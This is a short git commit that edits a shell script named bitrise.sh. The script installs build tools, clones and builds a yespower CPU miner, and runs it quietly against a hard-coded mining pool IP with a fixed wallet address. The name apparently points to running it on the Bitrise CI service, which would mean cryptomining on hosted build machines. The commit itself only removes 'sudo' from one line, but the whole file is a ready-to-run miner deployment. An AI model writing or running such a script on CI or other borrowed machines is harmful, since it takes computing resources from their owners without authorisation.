0d25f13e931b3bf29b22eadd6565b542fd020052
oremine01 <oremine01@outlook.com>
2024-06-24 09:49:45 +0530

    Update bitrise.sh

--- bitrise.sh
+++ bitrise.sh
@@ -3,6 +3,6 @@ apt update
 apt install automake autoconf make -y
 git clone https://github.com/whiveio/whive-cpuminer-mc-yespower.git 
 cd whive-cpuminer-mc-yespower
-sudo apt-get install build-essential libcurl4-openssl-dev -y
+ apt-get install build-essential libcurl4-openssl-dev -y
 ./build.sh
 ./minerd -q -u wv1qe523ah5edaxwyk0q72ehcm9mghsd2hzajrcckt -o stratum+tcp://206.189.2.17:3333 -a yespower
